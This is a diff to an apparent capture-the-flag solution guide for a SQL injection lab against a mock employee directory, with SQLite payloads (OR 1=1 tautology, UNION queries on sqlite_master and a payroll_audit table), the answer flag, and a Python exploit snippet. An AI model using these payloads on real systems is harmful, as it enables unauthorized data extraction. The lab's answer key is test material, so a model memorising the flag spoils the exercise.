@@ -12,7 +12,7 @@
 | **Target Application**           | Corporate Employee Directory (`/api/search?q=`)                          |
 | **Vulnerability Classification** | **CWE-89**: SQL Injection \| **OWASP Top 10**: A03:2021 (Injection)      |
 | **MITRE ATT&CK Technique**       | **T1190**: Exploit Public-Facing Application                             |
-| **Underlying Database**          | SQLite 3 (in-memory engine)                                              |
+| **Underlying Database**          | SQLite 3 (`data/corp_directory.db`)                                      |
 | **Vulnerable Parameter**         | `q` (HTTP GET search parameter concatenated directly into SQL statement) |
 | **Target Data Extracted**        | Table `payroll_audit` (confidential executive bonus records)             |
 | **Recovered Incident Flag**      | `FLAG{sqli_union_payroll_leak_pwned}`                                    |
@@ -29,7 +29,7 @@ Follow these sequential steps in the interactive Marimo notebook or in your pene
 
 1. **Test Normal Application Behavior**:
    - In **Step 1: Interactive SQL Injection Console**, set the `Methodology Preset:` dropdown to:
-     `1. Baseline Query: 'Alice'`
+     `1. Standard Search: 'Alice'`
    - The application executes:
      ```sql
      SELECT id, name, department, email FROM employees WHERE name LIKE '%Alice%'
@@ -54,7 +54,7 @@ Follow these sequential steps in the interactive Marimo notebook or in your pene
 
 1. **Inject Boolean Tautology**:
    - Set `Methodology Preset:` to:
-     `3. Boolean Tautology: ''' OR 1=1 --'`
+     `3. Boolean Filter Bypass: ''' OR 1=1 --'`
    - The constructed query becomes:
      ```sql
      SELECT id, name, department, email FROM employees WHERE name LIKE '%' OR 1=1 --%'
@@ -83,28 +83,33 @@ Follow these sequential steps in the interactive Marimo notebook or in your pene
 
 ### Step 4: Schema Discovery via `sqlite_master`
 
-1. **Dump Database Schema**:
-   - In SQLite, table definitions and schemas are stored in the internal table `sqlite_master`.
-   - Set `Methodology Preset:` to:
-     `5. Schema Discovery: ''' UNION SELECT 1, sql, tbl_name, 4 FROM sqlite_master --'`
-   - Constructed SQL:
+1. **Construct Custom Schema Enumeration Payload**:
+   - In SQLite, all table definitions and schemas are cataloged in the internal metadata table `sqlite_master`.
+   - In the `Methodology Preset:` dropdown, select **`Custom Injection Query`**.
+   - In the `SQL Injection Input:` text box, enter:
+     ```sql
+     ' UNION SELECT 1, sql, tbl_name, 4 FROM sqlite_master --
+     ```
+   - Constructed backend query:
      ```sql
      SELECT id, name, department, email FROM employees WHERE name LIKE '%' UNION SELECT 1, sql, tbl_name, 4 FROM sqlite_master --%'
      ```
 2. **Review Extracted Tables**:
-   - The query reveals two tables in the database:
+   - The query reveals the database tables in the returned table view:
      1. `CREATE TABLE employees (id INTEGER PRIMARY KEY, name TEXT, department TEXT, email TEXT)`
      2. `CREATE TABLE payroll_audit (id INTEGER PRIMARY KEY, employee_id INT, notes TEXT, flag TEXT)`
-   - The table `payroll_audit` contains 4 columns: `id`, `employee_id`, `notes`, and `flag`!
+   - The hidden table `payroll_audit` contains 4 columns: `id`, `employee_id`, `notes`, and `flag`!
 
 ---
 
 ### Step 5: Data Exfiltration from `payroll_audit`
 
 1. **Extract Confidential Payroll Audit Records**:
-   - Set `Methodology Preset:` to:
-     `6. Data Exfiltration: ''' UNION SELECT id, employee_id, notes, flag FROM payroll_audit --'`
-   - Constructed SQL:
+   - Keeping `Custom Injection Query` selected, update the input box to target the discovered table:
+     ```sql
+     ' UNION SELECT id, employee_id, notes, flag FROM payroll_audit --
+     ```
+   - Constructed backend query:
      ```sql
      SELECT id, name, department, email FROM employees WHERE name LIKE '%' UNION SELECT id, employee_id, notes, flag FROM payroll_audit --%'
      ```
@@ -118,12 +123,14 @@ Follow these sequential steps in the interactive Marimo notebook or in your pene
 
 ### Step 6: Flag Verification & Submission
 
-1. **Verify the Flag**:
-   - Scroll to **Step 4: Verify Exfiltrated Incident Flag**.
+1. **Verify the Flag in the Notebook**:
+   - Scroll to **Step 3: Verify Exfiltrated Incident Flag & Audit Report**.
    - Enter: `FLAG{sqli_union_payroll_leak_pwned}`.
+   - The workbench validates the candidate flag using one-way cryptographic SHA-256 verification (`c59b621f2c5385234123519cca4e7cce0a51f1280fbdc9466d8a028dfb5371ba`), preventing plaintext answers from being inspected in the notebook code.
    - Confirm the green notification card: `🎉 FLAG VERIFIED CORRECT!`.
+   - Upon correct verification, the confirmed **Vulnerability Assessment Report** unlocks below the input box.
 2. **Submit to Portal**:
-   - Enter `FLAG{sqli_union_payroll_leak_pwned}` into the CyberLab portal pane to score 150 points.
+   - Enter `FLAG{sqli_union_payroll_leak_pwned}` into the CyberLab portal pane to score 150 points and validate your Web Security competency.
 
 ---
 
@@ -133,16 +140,12 @@ To demonstrate the full exploitation pipeline programmatically using Python `sql
 
 ```python
 import sqlite3
+from pathlib import Path
 
 # Connect to target SQLite database
-conn = sqlite3.connect(":memory:")
+db_path = Path("data/corp_directory.db")
+conn = sqlite3.connect(db_path)
 cur = conn.cursor()
-
-# Set up vulnerable schema and records
-cur.execute("CREATE TABLE employees (id INT, name TEXT, department TEXT, email TEXT)")
-cur.execute("CREATE TABLE payroll_audit (id INT, employee_id INT, notes TEXT, flag TEXT)")
-cur.execute("INSERT INTO employees VALUES (1, 'Alice Smith', 'Engineering', 'alice@corp.internal')")
-cur.execute("INSERT INTO payroll_audit VALUES (1, 4, 'Executive bonus', 'FLAG{sqli_union_payroll_leak_pwned}')")
 
 # Exploit payload: UNION SELECT against payroll_audit
 payload = "' UNION SELECT id, employee_id, notes, flag FROM payroll_audit --"
